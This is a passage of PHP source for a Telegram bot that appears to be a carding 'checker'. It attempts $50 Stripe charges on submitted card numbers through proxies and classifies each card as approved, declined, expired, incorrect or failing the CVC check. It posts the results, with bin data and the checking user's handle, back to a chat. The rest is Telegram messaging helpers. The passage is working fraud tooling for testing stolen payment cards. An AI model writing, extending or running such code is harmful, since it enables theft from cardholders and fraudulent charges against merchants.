                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($50)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
                $live = True;
            }elseif((strpos($result1, 'The card number is incorrect.')) || (strpos($result1, 'Your card number is incorrect.')) || (strpos($result1, 'incorrect_number'))){
                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: INCORRECT ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($50)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
                $live = False;
            }elseif((strpos($result1, 'Your card has expired.')) || (strpos($result1, 'expired_card'))){
                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: EXPIRED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($50)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
                $live = False;
            }elseif((strpos($result1, 'Incomplete or incorrect payment information.'))){
		$respo = trim(strip_tags(capture($result1,'"message":"','"')));
                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($50)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
                $live = False;
            }elseif((strpos($result1, "Your card was declined.")) || (strpos($result1, 'The card was declined.')) || (strpos($result1, "do_not_honor")) || (strpos($result1, '"decline_code": "generic_decline"')) || (strpos($result1, "generic_decline")) || (strpos($result1, "Your card does not support this type of purchase")) || (strpos($result1, "card_error_authentication_required"))){
                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($50)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
                $live = False;
            }elseif((strpos($result1, '"cvc_check": "unavailable"')) || (strpos($result1, '"cvc_check": "unchecked"')) || (strpos($result1, '"cvc_check": "fail"'))){
                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: CVC CHECK UNAVAILABLE ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($50)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
                $live = False;
            }elseif(strpos($result1, 'null')){
                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($50)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
                $live = False;
            }else{
                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($50)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
                $live = False;
            }
if($live) {
editMessage($chat_id, $respuesta, $id_text);
die();
} else {
editMessage($chat_id, $respuesta, $id_text);
die();
}
//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();
}



//-------------------END CHECKER CCS------------------//
//else if(isset($message)){
/*
elseif ((strpos($message, "!") === 0 && strlen($message) > 1) || (strpos($message, "/") === 0 && strlen($message) > 1) || (strpos($message, ".") === 0 && strlen($message) > 1)) {
        $respuesta = "Perdón no te entiendo!!!";
        sendMessage($chat_id,$respuesta,$message_id);
}
*/

elseif (preg_match('/^[\/!\.]\w+/', $message)) {
    // Si el mensaje comienza con /, ! o . seguido de alguna palabra
    $respuesta = "Perdón no te entiendo!!!";
    sendMessage($chat_id,$respuesta,$message_id);
   // echo "$respuesta";
} else {
    // Ignorar mensajes que no son comandos
}

//-------FUNCION DE ENVIAR---------//
function sendMessage($chatID, $respuesta, $message_id) {
$url = $GLOBALS["website"]."/sendMessage?disable_web_page_preview=true&chat_id=".$chatID."&reply_to_message_id=".$message_id."&parse_mode=HTML&text=".urlencode($respuesta);
//$url = $GLOBALS["website"]."/sendMessage?disable_web_page_preview=true&chat_id=".$chatID."&parse_mode=HTML&text=".urlencode($respuesta);
$cap_message_id = file_get_contents($url);
//------------EXTRAE EL ID DEL MENSAGE----------//
$id_cap = capture($cap_message_id, '"message_id":', ',');
file_put_contents("ID", $id_cap);
}

function sendMessageNew($chatID, $respuesta, $message_id) {
$url = $GLOBALS["website"]."/sendMessage?disable_web_page_preview=true&chat_id=".$chatID."&parse_mode=HTML&text=".urlencode($respuesta);
file_get_contents($url);
}

function sendPv($chatID, $respuesta) {                                      $url = $GLOBALS["website"]."/sendMessage?chat_id=".$chatID."&text=".urlencode($respuesta);
    file_get_contents($url);                                            }


function editMessage($chatID, $respuesta, $id_text){
$url = $GLOBALS["website"]."/editMessageText?disable_web_page_preview=true&chat_id=".$chatID."&message_id=".$id_text."&parse_mode=HTML&text=".urlencode($respuesta);
file_get_contents($url);
}


//------------------------------//

function deleteMessage($chatID, $message_id){
$url = $GLOBALS["website"]."/deleteMessage?chat_id=".$chatID."&message_id=".$message_id."";
file_get_contents($url);
}

function kickChatMember($chatID, $id){
$url = $GLOBALS["website"]."/kickChatMember?chat_id=".$chatID."&user_id=".$id."";
file_get_contents($url);
}

function unbanChatMember($chatID, $id){
$url = $GLOBALS["website"]."/unbanChatMember?chat_id=".$chatID."&user_id=".$id."";
file_get_contents($url);
}





/*
function sendMessage($chatID, $respuesta) {
        $url = $GLOBALS["website"]."/sendMessage?chat_id=".$chatID."&parse_mode=HTML&text=".urlencode($respuesta);
        file_get_contents($url);
}
*/


?>
